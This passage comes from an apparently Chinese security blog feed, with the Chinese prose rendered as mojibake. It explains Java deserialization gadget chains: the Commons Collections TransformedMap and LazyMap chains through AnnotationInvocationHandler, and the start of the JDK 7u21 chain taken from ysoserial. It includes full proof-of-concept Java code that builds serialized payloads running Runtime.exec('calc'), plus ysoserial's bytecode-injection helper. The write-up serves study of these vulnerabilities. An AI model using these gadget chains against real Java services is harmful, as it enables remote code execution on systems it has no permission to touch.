å…¥çš„mapçš„æ¯ä¸€ä¸ªvalueæ‰§è¡Œäº†setValueã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150142.png" alt="QQæˆªå›¾20210217150142"></p><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°ä¼šå¯¹å€¼è¿›è¡Œtransformæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯ç›¸å½“äºè§¦å‘äº†ä¸€æ¬¡Map.put()ã€‚æ¥ä¸‹æ¥ï¼Œå°±æ˜¯payloadæ„é€ æ—¶é—´äº†ã€‚</p><p>ä½†æ˜¯ AnnotationInvocationHandler æ˜¯å†…éƒ¨ç±»æ— æ³•ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†å®ƒçš„çˆ¶ç±»InvocationHandlerå¯ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„å¾—åˆ° AnnotationInvocationHandler æ„é€ æ–¹æ³•ï¼Œç„¶åå¯¹å…¶ä½¿ç”¨newInstanceå†å‘ä¸Šè½¬å‹ä¸ºçˆ¶ç±» InvocationHandler ã€‚æ—¢ç„¶è¦è·å¾—å¯¹è±¡ï¼Œæˆ‘ä»¬å°±åº”è¯¥å…³æ³¨ä¸€ä¸‹å®ƒçš„æ„é€ æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 &#x3D; var1.getInterfaces();</span><br><span class="line">    if (var1.isAnnotation() &amp;&amp; var3.length &#x3D;&#x3D; 1 &amp;&amp; var3[0] &#x3D;&#x3D; Annotation.class) &#123;</span><br><span class="line">        this.type &#x3D; var1;</span><br><span class="line">        this.memberValues &#x3D; var2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œvar2ä¸ç”¨è¯´äº†å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„Mapï¼Œvar1å‘¢ï¼Ÿæ˜¯Annotationç±»ï¼Œå³æ‰€æœ‰æ³¨é‡Šç±»çš„æ¥å£ã€‚æˆ‘ä»¬å¿…é¡»åœ¨æ­¤å¤„ä¼ å…¥ä¸€ä¸ªæ³¨é‡Šç±»æ‰èƒ½ä½¿ifåˆ¤æ–­ä¸ºçœŸï¼Œæ‰èƒ½æŠŠæˆ‘ä»¬çš„å‚æ•°ä¸­çš„Mapä¼ å…¥ã€‚<br>ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰æ³¨é‡Šç±»ä¼ è¿›å»éƒ½æœ‰æ•ˆï¼Œæ³¨é‡Šç±»ï¼ˆå®é™…ä¸Šå°±æ˜¯æ¥å£ï¼‰å¿…é¡»æœ‰å®šä¹‰çš„æ–¹æ³•æ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ–ã€‚å…³äºæ­¤ç‚¹æˆ‘ä»¬åé¢å†è¯¦ç»†è°ˆè°ˆã€‚</p><p>å› ä¸ºå†readObjectæ–¹æ³•é‡Œæˆ‘ä»¬ä¼šæ‰§è¡Œ**Map var3 = var2.memberTypes()**ï¼Œæˆ‘ä»¬çœ‹çœ‹memberTypesæºç ã€‚</p><p>å‘ç°æ˜¯è¿”å›æ„é€ æ–¹æ³•ä¸­å®šä¹‰å¥½çš„memberTypeså±æ€§ã€‚è€Œè¿™ä¸ªmemberTypeså±æ€§åˆå’Œä¸Šä¸€è¡Œçš„var2å±æ€§æœ‰å…³ï¼Œvar2å±æ€§åˆä¸getDecalredMethodsæœ‰å…³â€¦å› æ­¤æˆ‘æ‰çŒœæµ‹ â€œæ³¨é‡Šç±»å¿…é¡»æœ‰å®šä¹‰çš„æ–¹æ³•æ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ– â€œ,ä½†å®é™…ç»“æœç¡®å®å¦‚æ­¤ã€‚<br>ç›®å‰æ‰¾åˆ°çš„èƒ½å¤Ÿæ­£å¸¸è§¦å‘æ¼æ´çš„æ³¨é‡Šç±»æœ‰ Target Retention SuppressWarnings .æ— ä¸€ä¾‹å¤–ä»–ä»¬ä½œä¸ºæ¥å£éƒ½å®šä¹‰äº†æ–¹æ³•ã€‚è€Œä¸”åœ¨æˆ‘ç¿»é˜…ä¸€äº›å‚è€ƒæ–‡æ¡£åï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ ·</p><p>å¦å¤–ä¸€ç‚¹éœ€è¦æ³¨æ˜çš„æ˜¯ï¼ŒRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializeæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½è¢«ç›´æ¥åºåˆ—åŒ–ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬åœ¨transformeré“¾é‡Œæƒ³ç›´æ¥é€šè¿‡æœ‰*<em>new ConstantTransformer(Runtime.\</em>getRuntime*())**æ¥è·å–Runtimeå¯¹è±¡æ—¶ï¼Œä¼šååºåˆ—åŒ–å¤±è´¥ã€‚<br>ä½†æ˜¯Classç±»æ˜¯æœ‰ç»§æ‰¿Serializeæ¥å£çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡transformeré“¾å’Œåå°„æ¥åœ¨ååºåˆ—åŒ–é˜¶æ®µé€æ­¥åˆ›å»ºRuntimeç±»ï¼Œç»§è€Œè§£å†³è¿™ä¸ªé—®é¢˜</p><p>æ€»ç»“ä¸€ä¸‹å‡ ä¸ªå‘ç‚¹ï¼š<br>1.Runtimeç±»ä¸èƒ½è¢«åºåˆ—åŒ–<br>\2. AnnotationInvocationHandler æ— æ³•ç›´æ¥å®ä¾‹åŒ–ï¼Œå¯é€šè¿‡åå°„è·å¾—å¯¹è±¡<br>3.æ³¨æ„åœ¨å®ä¾‹åŒ– AnnotationInvocationHandler æ—¶è¦ä¼ å…¥å®šä¹‰å¥½æ–¹æ³•çš„æ³¨é‡Šç±»<br>OKï¼Œä»¥ä¸ŠçŸ¥é“äº†åå°±èƒ½è¯•ç€å†™ä¸€ä¸‹payloadäº†ï¼ˆè¿™ä¸ªpayloadä¾æ—§ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œé”™è¯¯å‡ºå¤„é—´ä»£ç æ³¨é‡Šï¼Œå…·ä½“åŸå› çœ‹ä¸‹æ–‡ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.*;</span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;new String(&quot;getRuntime&quot;),new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;calc.exe&quot;)&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            ChainedTransformer chain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            innermap.put(&quot;sc&quot;,&quot;b&quot;);  &#x2F;&#x2F;ä¸èƒ½æ‰§è¡Œçš„åŸå› åœ¨è¿™é‡Œï¼Œå¦‚æœæ˜¯put(&quot;value&quot;,&quot;a&quot;)å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œ</span><br><span class="line">            Map outmap &#x3D; TransformedMap.decorate(innermap,null,chain);</span><br><span class="line"></span><br><span class="line">            Class Annotation &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor AnnotationCons &#x3D; Annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            AnnotationCons.setAccessible(true);</span><br><span class="line">            InvocationHandler InvocationHandler &#x3D; (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;a.bin&quot;)));</span><br><span class="line">            a.writeObject(InvocationHandler);</span><br><span class="line">            a.close();</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">            b.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸èƒ½æ‰§è¡Œï¼Œè¿™åŸå› ä¸ä¸Šé¢æåˆ°çš„â€œ æ³¨æ„åœ¨å®ä¾‹åŒ– AnnotationInvocationHandler æ—¶è¦ä¼ å…¥å®šä¹‰å¥½æ–¹æ³•çš„æ³¨é‡Šç±» â€å¾ˆæœ‰å…³è”ã€‚<br>å› ä¸ºæ¶‰åŠJVMçš„ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¸ä¼šæ€ä¹ˆå»æ·±ç©¶ï¼Œå°±æ˜¯æµ…æµ…çš„çœ‹ä¸€ä¸‹ï¼Œåšå‡ºä¸€äº›æ¨æµ‹ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å…³æ³¨åˆ° AnnotationInvocationHandler çš„readObjectã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150215.png" alt="QQæˆªå›¾20210217150215"></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¤æ‚çš„æ¨ç†äº†ï¼Œå»ºè®®å…ˆæŠŠå„æ–¹æ³•çš„æ„ä¹‰å¼„æ˜ç™½<br>å‘ç°å¿…é¡»è¦var7ï¼=nullæ‰èƒ½æ­£å¸¸è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆvar7çš„æ¥æºæ˜¯ä»(Map)var3ä¸­è·å¾—ä»¥(String)var6ä¸ºé”®åçš„å€¼ã€‚var6æ˜¯var3ä¸­ä¸€é¡¹çš„é”®åã€‚è€Œvar3çš„æ¥æºæ˜¯(Annotation)var2çš„menberTypes,æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150244.png" alt="QQæˆªå›¾20210217150244"></p><p>é‚£ä¹ˆvar1å°±æ˜¯AnnotationInvocationHandlerçš„typeå±æ€§äº†ï¼Œè€Œè¿™ä¸ªtypeå±æ€§åœ¨å…¶æ„é€ æ–¹æ³•ä¸­å°±å®šä¹‰å¥½äº†ï¼Œæ˜¯ä¼ å…¥çš„æ³¨é‡Šç±»ã€‚<br>ä¹Ÿå°±æ˜¯è¯´var1å°±æ˜¯æˆ‘ä»¬åœ¨å®ä¾‹ AnnotationInvocationHandler æ—¶ä¼ å…¥çš„æ³¨é‡Šç±»ã€‚<br>ç»“åˆä»¥ä¸Šæµç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“è¿™ä¸ªè¿‡ç¨‹æ˜¯:<br>ä» å®ä¾‹ AnnotationInvocationHandler æ—¶ä¼ å…¥çš„æ³¨é‡Šç±» ä¸­è·å–æœ€åä¸€ä¸ªæ–¹æ³•ï¼Œç„¶åæŠŠå®ƒç¼–å…¥ä¸ºä¸€ä¸ªHashMap(ä»¥ä¸‹ç§°ä¸ºæ³¨é‡Šæ–¹æ³•Map)çš„ä¸€ä¸ªé”®åå¹¶ç»™äºˆå€¼ã€‚åœ¨readObjectæ—¶ä¼šéå†ä¼ å…¥çš„Mapï¼Œå¦‚æœåœ¨ä¼ å…¥çš„Mapä¸­æ‰¾åˆ°äº†ä¸€é¡¹çš„é”®ååœ¨æ³¨é‡Šæ–¹æ³•Mapä¸­å­˜åœ¨ï¼ˆå³ åœ¨ä¼ å…¥çš„Mapä¸­æ‰¾åˆ°äº†ä¸€é¡¹çš„é”®åä¸å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„æ³¨é‡Šç±»çš„æœ€åä¸€ä¸ªæ–¹æ³•åŒåï¼‰ï¼Œåˆ™ifæ¡ä»¶ä¸ºçœŸï¼Œæ”»å‡»æˆåŠŸã€‚<br>æ‰€ä»¥ä¸Šé¢ä¸ºä»€ä¹ˆput(â€œvalueâ€,ä»»æ„)æ‰èƒ½è¾¾æˆæ”»å‡»çš„åŸå› æ˜¯ï¼Œ Target Retention SuppressWarnings è¿™ä¸‰ä¸ªæ³¨é‡Šç±»éƒ½æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ–¹æ³•åä¸ºvalueçš„æ–¹æ³•ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150343.png" alt="QQæˆªå›¾20210217150343"></p><p>åˆ†æå®Œäº†ã€‚è¿™ä¸ªæ´åˆ©ç”¨ç‰ˆæœ¬åªèƒ½åœ¨8u71ä»¥å‰ï¼Œæ¯”è¾ƒå¤è€æ— ç”¨ã€‚</p><h2 id="LazyMapé“¾"><a href="#LazyMapé“¾" class="headerlink" title="LazyMapé“¾"></a>LazyMapé“¾</h2><h3 id="RCEåŸç†-1"><a href="#RCEåŸç†-1" class="headerlink" title="RCEåŸç†"></a>RCEåŸç†</h3><p>LazyMapçš„è·å¾—æ–¹æ³•å’ŒTransfromerMapå·®ä¸å¤šã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    Map innerMap &#x3D; new HashMap();</span><br><span class="line">    Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    if (!super.map.containsKey(key)) &#123;</span><br><span class="line">        Object value &#x3D; this.factory.transform(key);</span><br><span class="line">        super.map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return super.map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹LazyMapä½¿ç”¨getæ–¹æ³•æ—¶ï¼Œå®ƒä¼šæ‰§è¡Œthis.factory.transform(key),è€Œthis.factory.transformå¦‚æœå»è·Ÿè¿›åˆ†æçš„è¯ï¼Œå®è´¨ä¸Šå°±æ˜¯è°ƒç”¨æˆ‘ä»¬åœ¨decorateä¼ è¿›å»çš„Transformerç±»ã€‚</p><h3 id="è§¦å‘-1"><a href="#è§¦å‘-1" class="headerlink" title="è§¦å‘"></a>è§¦å‘</h3><p>LazyMapçš„è§¦å‘ç‚¹ä¹Ÿåœ¨ AnnotationInvocationHandler ä¸­ï¼Œä½†ä¸æ˜¯åœ¨readObjectæ–¹æ³•ï¼Œè€Œæ˜¯åœ¨invokeæ–¹æ³•ã€‚invokeæ–¹æ³•ä¸­æœ‰ä¸€è¡Œ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object var6 &#x3D; this.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­this.memberValesæ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­å®šä¹‰ä¸ºä¼ å…¥çš„Mapã€‚</p><p>é‚£ä¹ˆinvokeæ–¹æ³•è¦æ€ä¹ˆæ‰èƒ½è§¦å‘å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åŠ¨æ€ä»£ç†ã€‚<br>ç†Ÿæ‚‰åŠ¨æ€ä»£ç†çš„æœ‹å‹è‚¯å®šç›´åˆ°ï¼Œinvokeæ–¹æ³•æ—¶åŠ¨æ€ä»£ç†ä¸­çš„ä¸€ä¸ªç‰¹æ®Šçš„æ–¹æ³•ï¼Œåœ¨ä»£ç†ç±»ä¸­æ— è®ºæ‰§è¡Œä»€ä¹ˆæ–¹æ³•ï¼Œå®è´¨ä¸Šéƒ½æ˜¯åœ¨æ‰§è¡Œinvokeæ–¹æ³•ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯éªšæ€è·¯äº†ï¼š<br>æˆ‘ä»¬é€šè¿‡åå°„å’Œå‘ä¸Šè½¬å‹å¾—åˆ°ä¸€ä¸ª <strong>AnnotationInvocationHandler(Class var1, Map var2)</strong> å¯¹è±¡ã€‚<br>æ„å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åˆšåˆšå¾—åˆ°çš„ <strong>AnnotationInvocationHandler</strong> å¯¹è±¡ï¼Œå†æ•…æŠ€é‡æ–½å°†å…¶é€šè¿‡å‘ä¸Šè½¬å‹å¾—åˆ°ä¸€ä¸ª <strong>AnnotationInvocationHandler</strong> å¯¹è±¡ã€‚å½“è¯¥å¯¹è±¡ååºåˆ—åŒ–æ‰§è¡ŒreadObjctæ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸‹entrysetæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217150359.png" alt="QQæˆªå›¾20210217150359"></p><p>æœ¬è´¨ä¸Šæ¥è¯´ï¼Œæ˜¯å¯¹ä¸€ä¸ªä»£ç†ç±»æ‰§è¡Œäº†ä¸€ä¸‹entrySetæ–¹æ³•ï¼Œå³æ‰§è¡Œäº†ä»£ç†ç±»çš„invokeæ–¹æ³•ï¼Œåˆå› ä¸ºä»£ç†ç±»çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¡«å…¥çš„æ˜¯ <strong>AnnotationInvocationHandler</strong> å¯¹è±¡ï¼Œå…¶å†…éƒ¨å·²ç»å†™å¥½äº†invokeæ–¹æ³•ï¼Œæ‰€ä»¥æ­¤å¤„æ‰§è¡Œçš„ä»£ç†ç±»çš„invokeæ–¹æ³•å³ <strong>AnnotationInvocationHandler</strong> å¯¹è±¡çš„invokeæ–¹æ³•ï¼Œç»§è€Œè§¦å‘äº†getæ–¹æ³•ï¼Œç»§è€Œè§¦å‘äº†æ¼æ´ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¦™çš„åœ°æ–¹</p><p>å¤šè¯´æ— ç›Šï¼Œæ•´paylaodå§</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">            org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123;</span><br><span class="line">                    &#x2F;&#x2F; åŒ…è£…å¯¹è±¡</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;getRuntime&quot;,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                            null,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;calc&quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            cons.setAccessible(true);</span><br><span class="line">&#x2F;&#x2F;å¦™å¤„</span><br><span class="line">            InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;è·å¾—ä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡</span><br><span class="line">            Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªMapçš„ä»£ç†ç±»ï¼Œå…¶ä»£ç†æ–¹æ³•ä¸ºAnnotationInvocationHandlerå¯¹è±¡é‡Œçš„invokeæ–¹æ³•</span><br><span class="line">            InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox);  &#x2F;&#x2F;å°†ä»£ç†Mapä¼ å…¥ï¼Œå½“ä»£ç†Mapè¢«æ‰§è¡Œä»»ä¸€æ–¹æ³•æ—¶ï¼Œæ‰§è¡Œinvokeæ–¹æ³•</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;));</span><br><span class="line">            a.writeObject(handler1);</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Transformer-Map-é“¾&quot;&gt;&lt;a href=&quot;#Transformer-Map-é“¾&quot; class=&quot;headerlink&quot; title=&quot;Transformer Map é“¾&quot;&gt;&lt;/a&gt;Transformer Map é“¾&lt;/h2&gt;&lt;h3 id=&quot;RCEåŸç†</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>7u21é“¾æµ…æ</title>
    <link href="http://const27.com/2021/06/28/7u21%E9%93%BE%E6%B5%85%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/7u21%E9%93%BE%E6%B5%85%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.037Z</published>
    <updated>2021-06-28T13:48:09.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>jdk7u21 é“¾ï¼Œæ˜¯ä¸€ä¸ªä¸éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹åº“å°±èƒ½å®ç°çš„é“¾ã€‚å½±å“ç‰ˆæœ¬&lt;=7u21</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="from-ysonerial"><a href="#from-ysonerial" class="headerlink" title="from ysonerial"></a>from ysonerial</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ysonerialé‡Œçš„payloadæ˜¯æ€ä¹ˆå†™çš„ï¼Œç„¶åæ²¿ç€å…¶æ€è·¯è¿›è¡Œåˆ†æ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object getObject(String command) throws Exception &#123;</span><br><span class="line">    Object templates &#x3D; Gadgets.createTemplatesImpl(command);</span><br><span class="line">    String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line">    HashMap map &#x3D; new HashMap();</span><br><span class="line">    map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line">    InvocationHandler tempHandler &#x3D; (InvocationHandler)Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(Override.class, map);</span><br><span class="line">    Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br><span class="line">    Templates proxy &#x3D; (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]);</span><br><span class="line">    LinkedHashSet set &#x3D; new LinkedHashSet();</span><br><span class="line">    set.add(templates);</span><br><span class="line">    set.add(proxy);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, (Object)null);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_class&quot;, (Object)null);</span><br><span class="line">    map.put(zeroHashCodeStr, templates);</span><br><span class="line">    return set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œysonerialçš„payloadä¸Šæ¥å°±é€šè¿‡Gadgets.createTemplatesImpl(command) è¯•å›¾åˆ›å»ºä¸€ä¸ªTemplatesImplç±»ã€‚<br>createTemplatesImplæºç å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ç°åˆ›å»ºTemplatesImplç±»ååˆé€šè¿‡åå°„å’Œjavassiståšäº†è®¸å¤šæ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; T createTemplatesImpl(String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory) throws Exception &#123;</span><br><span class="line">    T templates &#x3D; tplClass.newInstance();</span><br><span class="line">    ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(new ClassClassPath(abstTranslet));</span><br><span class="line">    CtClass clazz &#x3D; pool.get(Gadgets.StubTransletPayload.class.getName());</span><br><span class="line">    String cmd &#x3D; &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) + &quot;\&quot;);&quot;;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());</span><br><span class="line">    CtClass superC &#x3D; pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    byte[] classBytes &#x3D; clazz.toBytecode();</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);</span><br><span class="line">    Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());</span><br><span class="line">    return templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åˆ›å»ºè¿™ä¸ªç±»å¹¶ä¸”è°ƒç”¨åå°„å’Œjavassistæœºåˆ¶å‘¢ï¼Ÿå…ˆä¸æ€¥ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹TemplatesImplæºç ã€‚</p><p>é¦–å…ˆTemplatesImplç±»ä¸­æœ‰ä¸ªæ–¹æ³•defineTransletClassesï¼Œå®ƒçš„ä¸»è¦ä»£ç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private byte[][] _bytecodes &#x3D; (byte[][])null;</span><br><span class="line"></span><br><span class="line">private void defineTransletClasses() throws TransformerConfigurationException &#123;</span><br><span class="line">        if (this._bytecodes &#x3D;&#x3D; null) &#123;</span><br><span class="line">.....</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            TemplatesImpl.TransletClassLoader loader &#x3D; (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">                public Object run() &#123;</span><br><span class="line">                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                int classCount &#x3D; this._bytecodes.length;</span><br><span class="line">                this._class &#x3D; new Class[classCount];</span><br><span class="line"></span><br><span class="line">        